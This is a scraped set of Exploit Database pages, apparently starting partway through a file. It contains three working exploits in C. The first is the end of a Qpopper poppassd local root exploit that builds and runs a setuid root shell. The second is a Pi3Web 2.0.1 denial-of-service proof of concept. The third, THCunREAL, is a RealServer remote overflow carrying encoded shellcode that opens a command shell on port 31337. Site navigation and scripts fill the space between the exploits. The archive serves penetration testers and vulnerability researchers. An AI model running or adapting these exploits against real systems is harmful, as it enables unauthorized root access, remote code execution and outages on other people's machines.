{\n");fprintf(fp,"setreuid(0,0);\nsetregid(0,0);\n");fprintf(fp,"setuid(0);\nsetgid(0);\n");fprintf(fp,"system(\"su -\");\n}\n");fclose(fp);memset((char *)sh_drop,0,sizeof(sh_drop));snprintf(sh_drop,sizeof(sh_drop)-1,"gcc -o %s %s.c >/dev/null 2>&1;""rm -f %s.c >/dev/null 2>&1",d_shell,d_shell,d_shell);system(sh_drop);memset((char *)d_shell,0,sizeof(d_shell));strncpy(d_shell,D_EXEC,sizeof(d_shell)-1);memset((char *)sh_drop,0,sizeof(sh_drop));snprintf(sh_drop,sizeof(sh_drop)-1,"%s.c",d_shell);if((fp=fopen(sh_drop,"w"))==NULL){perror(" [-] fopen() error");exit(-1);}fprintf(fp,"main() {\n");fprintf(fp,"setreuid(0,0);\nsetregid(0,0);\n");fprintf(fp,"setuid(0);\nsetgid(0);\n");fprintf(fp,"system(\"chown root: %s\");\n",D_SHELL);fprintf(fp,"system(\"chmod 6755 %s\");\n}\n",D_SHELL);fclose(fp);memset((char *)sh_drop,0,sizeof(sh_drop));snprintf(sh_drop,sizeof(sh_drop)-1,"gcc -o %s %s.c >/dev/null 2>&1;""rm -f %s.c >/dev/null 2>&1",d_shell,d_shell,d_shell);system(sh_drop);if((stat(D_SHELL,&ss)==0)&&(stat(D_EXEC,&ss)==0)){fprintf(stdout," [+] make code.\n");return(0);}else{fprintf(stderr," [-] code not found.\n");return(-1);}}int main(int argc, char *argv[]){int whtl;char user_id[BUF_SZ]=D_NAME;char passwd[BUF_SZ]=D_NAME;char tg_path[BUF_SZ]=D_POPPASS;char df_sh[BUF_SZ]=D_SHELL;(void)banrl();while((whtl=getopt(argc,argv,"U:u:P:p:T:t:Hh"))!=-1){extern char *optarg;switch(whtl){case 'U':case 'u':memset((char *)user_id,0,sizeof(user_id));strncpy(user_id,optarg,sizeof(user_id)-1);break;case 'P':case 'p':memset((char *)passwd,0,sizeof(passwd));strncpy(passwd,optarg,sizeof(passwd)-1);break;case 'T':case 't':memset((char *)tg_path,0,sizeof(tg_path));strncpy(tg_path,optarg,sizeof(tg_path)-1);break;case 'H':case 'h':(void)usage(argv[0]);break;case '?':fprintf(stderr," Try `%s -i' for more information.\n\n",argv[0]);exit(-1);break;}}if(!strcmp(user_id,D_NAME)||!strcmp(passwd,D_NAME)){(void)usage(argv[0]);exit(-1);}else{char comm[1024];int out[2],in[2];if(((int)m_sh())==-1){fprintf(stdout," [-] exploit failed.\n\n");exit(-1);}if(pipe(out)==-1){perror(" [-] pipe() error");exit(-1);}if(pipe(in)==-1){perror(" [-] pipe() error");exit(-1);}switch(fork()){case -1:perror(" [-] fork() error");break;case 0:close(out[0]);close(in[1]);dup2(out[1],STDOUT_FILENO);dup2(in[0],STDIN_FILENO);execl(tg_path,tg_path,"-s",D_EXEC,0);break;default:close(out[1]);close(in[0]);fprintf(stdout," [+] execute poppassd.\n");memset((char *)comm,0,sizeof(comm));read(out[0],comm,sizeof(comm)-1);fprintf(stdout," %s",comm);memset((char *)comm,0,sizeof(comm));snprintf(comm,sizeof(comm)-1,"user %s\r\n",user_id);fprintf(stdout," [+] input username.\n");write(in[1],comm,strlen(comm));memset((char *)comm,0,sizeof(comm));read(out[0],comm,sizeof(comm)-1);fprintf(stdout," %s",comm);memset((char *)comm,0,sizeof(comm));snprintf(comm,sizeof(comm)-1,"pass %s\r\n",passwd);fprintf(stdout," [+] input password.\n");write(in[1],comm,strlen(comm));memset((char *)comm,0,sizeof(comm));read(out[0],comm,sizeof(comm)-1);fprintf(stdout," %s",comm);memset((char *)comm,0,sizeof(comm));snprintf(comm,sizeof(comm)-1,"newpass %s\r\n",passwd);fprintf(stdout," [+] input fake new password.\n");write(in[1],comm,strlen(comm));close(out[0]);close(in[1]);break;}fprintf(stdout," [+] wait, 2sec.\n");sleep(2);if((stat(D_SHELL,&ss)==0)&&(ss.st_mode&S_ISUID)){fprintf(stdout," [+] Ok, exploited successfully.\n");fprintf(stdout," [*] It's Rootshell !\n\n");unlink(D_EXEC);execl(D_SHELL,D_SHELL,0);}else{fprintf(stdout," [-] exploit failed.\n\n");exit(-1);}}}void banrl(){fprintf(stdout,"\n Qpopper v4.0.x poppassd local root exploit.\n");fprintf(stdout,"                                by Xpl017Elz\n\n");}// milw0rm.com [2003-04-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 22
Pi3Web 2.0.1 - Denial of Service (PoC) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPi3Web 2.0.1 - Denial of Service (PoC)EDB-ID:22CVE:2003-0276EDB Verified:Author:aT4rType:dosExploit:/Platform:WindowsDate:2003-04-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* Pi3Web 2.0.1 DoS - Pr00f of concept.** Vulnerable systems: Pi3Web 2.0.1 (maybe others)* Vendor: www.johnroy.com/pi3  - http://pi3web.sourceforge.net/* Patch: no yet.** Info: Pi3Web Server is vulnerable to a denial of Service.* when a malformed HTTP Request is done the webserver hangs* due to an stack overflow. GET /////////..[354]../////////** Found by aT4r@3wdesign.es  04/26/2003* Compiled with: lcc-win32 v3.3.**/#pragma comment (lib,"ws2_32")#include <stdio.h>#include <windows.h>#include <winsock2.h>#include <string.h>char evilbuffer[1024],evilrequest[512],ip[15];short port=80;int isalive(int OPT){struct sockaddr_in haxorcitos;int fd;haxorcitos.sin_port = htons(port);haxorcitos.sin_family = AF_INET;haxorcitos.sin_addr.s_addr = inet_addr(ip);if ((fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1){printf(" [-] Unable to Create Socket\n\n");return(0);}if (connect(fd,( struct sockaddr *)&haxorcitos,sizeof(haxorcitos)) == -1){if (OPT==0)printf(" [+] Exploit Success. Remote webserver shutdown\n");elseprintf(" [-] Unable to connect\n\n");return(0);}if (OPT==0){printf(" [-] Exploit Failed. System Patched?\n\n");}else{send(fd,evilbuffer, strlen(evilbuffer),0);printf(" [+] Data Sent. Now Checking Host\n");closesocket(fd);}return(1);}void usage(void){printf(" [+] Usage: PiDoS.exe HOST [port]\n\n");	exit(1);}void main(int argc,char *argv[]){WSADATA ws;if	(WSAStartup( MAKEWORD(1,1), &ws )!=0){printf(" [+] WSAStartup() error\n");exit(0);}printf("\n . .. ...:Pi3Web Denial of Service (aT4r@3wdesign.es) :.....\n\n");if ((argc!=2) && (argc!=3))usage();strcpy(ip,argv[1]);if (argc==3) port=atoi(argv[2]);memset(evilrequest,0,512);memset(evilbuffer,0,1024);memset(evilrequest,'/',354);//sprintf(evilbuffer, "GET %s\r\n",evilrequest);sprintf(evilbuffer,"GET %s HTTP/1.0\r\nUser-Agent: foo\r\nHost:%s\r\n\r\n\r\n",evilrequest,argv[2]);if (isalive(1)){ sleep(1000); isalive(0);}}// milw0rm.com [2003-04-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 23
RealServer < 8.0.2 (Windows Platforms) - Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRealServer < 8.0.2 (Windows Platforms) - Remote OverflowEDB-ID:23CVE:2002-1643EDB Verified:Author:Johnny CyberpunkType:remoteExploit:/Platform:WindowsDate:2003-04-30Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*************************************************************//* THCunREAL 0.2 - Wind0wZ remote root exploit                                    *//* Exploit by: Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)        *//* THC PUBLIC SOURCE MATERIALS                                                       *//*                                                                                                      *//*                                                                                                      *//* This is the much more reliable version of the Realserver < 8.0.2 exploit *//* Tested with different OSes and Realserver Versions                              *//*                                                                                                      *//* While probing lot's of boxes via 'OPTIONS / RTSP/1.0' on TCP port 554  *//* i noticed that 99% of the probed machines are not up2date yet ! =;O)   *//*                                                                                                      *//* The shellcode is much shorter than the one in version 0.1 now and of    *//* course offsetless ! The encoder in front of the exploit is needed coz the *//* shellcode has next to 0x00,0x0d,0x0a also to be 0x20 and 0xff free !   *//*                                                                                                      *//* After successful exploitation  a commandshell should spawn on             *//* TCP port 31337 ! Use netcat to connect to this port !                            *//*                                                                                                      *//* If there's no connectable port 31337, maybe it's blocked by a firewall !  *//*                                                                                                      *//* Unfortunately i hadn't a Linux/Sparc or whatever Platform Realserver 8   *//* runs on. I just know it's also exploitable on other OSs !                        *//* So if u wanna exploit other platforms, try to get Realserver 8 and use    *//* gdb to find out, how this can be exploited ! Good luck !                        *//*                                                                                                      *//* compile with MS Visual C++ : cl THCunREAL.c /link ws2_32.lib                *//*                                                                                                      *//************************************************************/#include <stdio.h>#include <stdlib.h>#include <string.h>#include <winsock2.h>char w32portshell[] ="\x8b\xfa\x33\xc9\xb2\x35\x90\x90\x90\x66\x81\xc1\x38\x01\x83""\xc7\x1a\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\xde\x16\x4f\x5c""\x37\x30\x59\x6c\xcd\x28\xa9\xeb\xb9\xe4\x79\x45\xe1\x36\xc5""\x12\x15\x15\x05\x3d\x62\x66\x07\x6a\x06\x07\x1b\x71\x79\x79""\x34\xde\x30\xdd\xcc\xca\xca\xca\x68\xb6\xd8\x1f\x5f\x05\x6c""\x51\xbe\x34\xbe\x75\x39\xbe\x45\x29\x98\xbe\x4d\x3d\xb8\x6a""\x09\xbe\x2e\x34\xce\xbe\x6e\x4d\x34\xce\xbe\x7e\x29\x34\xcc""\xbe\x66\x11\x34\xcf\x66\x64\x67\xbe\x6e\x15\x34\xce\x04\xfc""\x74\x04\xf5\xac\xbe\x01\xbe\x34\xcb\x99\x04\xf7\xe4\xd7\xb1""\xf5\x40\xc2\x3a\x83\x70\x30\xb8\x71\x70\x31\x53\x0c\x25\x40""\xd4\x53\x04\x25\x6f\x6d\x6b\x63\x65\x67\x1e\x7b\x25\x74\x3a""\x82\x39\x7f\xbe\x31\xbd\x34\xcd\x3a\x83\x78\x30\xbc\x71\xb8""\xed\xcb\x78\x30\x40\x8b\xcb\x78\x31\x41\x14\xcb\x78\x17\xb8""\x68\x2d\x66\xca\xe5\xbc\xf2\x5f\x31\x6d\xbd\x70\x30\xb5\x70""\x42\x3f\xb8\x68\x41\xb5\x5e\x13\x21\xdc\x4d\xca\xca\xca\xbc""\xfb\x04\xee\x66\x66\x66\x66\x63\x73\x63\xca\xe5\xa2\x60\x6d""\x53\xbc\x05\x5f\x25\x60\x62\xca\x60\xe1\x7b\x63\x62\xca\x60""\xf9\x66\x60\x62\xca\x60\xe5\xa2\xb8\x70\xbd\x65\xca\x60\xd1""\x60\x60\xca\x60\xdd\xb8\x71\x30\x39\xa1\x66\x5d\x1b\x50\x4d""\x50\x5d\x69\x56\x58\x51\xa1\x04\xe7\xb8\x70\xf9\xa1\x62\x62""\x62\x66\x66\xcb\xf3\x34\xc7\x67\xa1\xb8\x70\x4d\x65\xb8\x70""\xbd\x65\x84\x3d\x66\x66\x5f\x25\xcb\xfb\x67\x66\x66\x66\x60""\xca\x60\xd9\x5f\xca\xca\x60\xd5";void usage();int main(int argc, char *argv[]){unsigned short realport=554;unsigned int sock,addr,i,rc;unsigned char exploit_buffer[4132];unsigned long retloc1,retloc2,retaddr;struct sockaddr_in mytcp;struct hostent * hp;WSADATA wsaData;printf("\nTHCunREAL v0.2 - Wind0wZ remote root sploit for Realserver < 8.0.2\n");printf("by Johnny Cyberpunk (jcyberpunk@thehackerschoice.com)\n");if(argc<2)usage();retloc1 = 0x6235108c;retloc2 = 0x623514b6;retaddr = 0x62354f5e;memset(exploit_buffer,'Z',4131);memcpy(exploit_buffer,"SETUP /",7);*(unsigned long *)&exploit_buffer[4082] = retloc1;*(unsigned long *)&exploit_buffer[4086] = retloc2;memcpy(&exploit_buffer[7],w32portshell,strlen(w32portshell));*(unsigned long *)&exploit_buffer[4090] = retaddr;memcpy(&exploit_buffer[4094],"\x83\xc2\x19\x52\xc3",5);memcpy(&exploit_buffer[4099]," RTSP/1.0\r\nTransport: THCr0x!\r\n\r\n",33);if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0){printf("WSAStartup failed !\n");exit(-1);}hp = gethostbyname(argv[1]);if (!hp){addr = inet_addr(argv[1]);}if ((!hp) && (addr == INADDR_NONE) ){printf("Unable to resolve %s\n",argv[1]);exit(-1);}sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);if (!sock){printf("socket() error...\n");exit(-1);}if (hp != NULL)memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);elsemytcp.sin_addr.s_addr = addr;if (hp)mytcp.sin_family = hp->h_addrtype;elsemytcp.sin_family = AF_INET;mytcp.sin_port=htons(realport);rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));if(rc==0){send(sock,exploit_buffer,4131,0);printf("\nexploit send .... sleeping a while ....\n");Sleep(1000);printf("\nok ... now try to connect to port 31337 via netcat !\n");}elseprintf("can't connect to realserver port!\n");shutdown(sock,1);closesocket(sock);exit(0);}void usage(){printf("\nUsage: <Host>\n");exit(0);}// milw0rm.com [2003-04-30]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed 